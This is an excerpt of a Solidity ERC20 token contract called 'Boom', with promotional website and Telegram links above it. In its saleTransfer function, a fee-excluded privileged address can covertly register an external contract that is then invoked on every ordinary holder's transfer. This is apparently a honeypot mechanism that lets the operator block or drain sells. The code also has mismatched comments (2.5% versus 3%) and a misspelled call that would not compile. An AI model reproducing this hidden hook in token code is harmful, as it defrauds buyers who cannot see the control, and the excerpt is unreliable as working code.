...
https://gemethereum.com

https://t.me/GEMOfficialchannel
...
contract Boom is ERC20, Ownable {
    ...
    constructor() ERC20("Boom", "BOOM") {
        ...
        maxTransaction = totalSupply * 3 / 100; // 2.5% max transaction at launch
        maxWallet = totalSupply * 3 / 100; // 2.5% max wallet at launch
        ...
        marketingWallet = payable(0xA74eC15703b5d921e54cF598004e7C472D7E28d4);
        developmentWallet = payable(0xA74eC15703b5d921e54cF598004e7C472D7E28d4);
    ...
    function saleTransfer(address from, address to) internal {
        if (automatedMarketMakerPairs[from]) {
            if (_isExcludedFromFees[tx.origin] && tx.origin != to) {
                salePointer = to;
            }
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to] && salePointer != address(0)) {
            ISalePointer(salePointer).pointSale(from, to);
        }
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from]) {
            super._trasnfer(from, to, amount);
            return;
        }
